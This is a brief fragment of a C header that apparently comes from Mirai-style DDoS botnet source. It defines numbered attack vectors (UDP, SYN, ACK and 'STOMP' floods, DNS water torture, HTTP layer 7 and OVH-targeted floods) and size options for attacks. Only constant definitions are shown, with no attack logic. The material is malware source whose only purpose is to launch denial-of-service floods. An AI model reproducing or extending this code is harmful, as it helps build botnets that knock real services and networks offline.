...
#define ATK_VEC_UDP_PLAIN  0  /* Plain UDP flood optimized for speed */
#define ATK_VEC_UDP        1  /* Straight up UDP flood */
#define ATK_VEC_DNS        2  /* DNS water torture */
#define ATK_VEC_STDHEX     3  /* XTD hex std Attck flood */
#define ATK_VEC_OVH        4  /* UDP OVH HEX flood*/
#define ATK_VEC_SYN        5  /* SYN flood with options */
#define ATK_VEC_ACK        6  /* ACK flood */
#define ATK_VEC_HTTP       7  /* HTTP layer 7 flood */
#define ATK_VEC_STORM      8  /* ACK+PSH TCP Flood */
#define ATK_VEC_XMAS       9
#define ATK_VEC_STOMP      10
#define ATK_VEC_RAW        11
...
#define ATK_OPT_MIN_SIZE        30 
#define ATK_OPT_MAX_SIZE        31
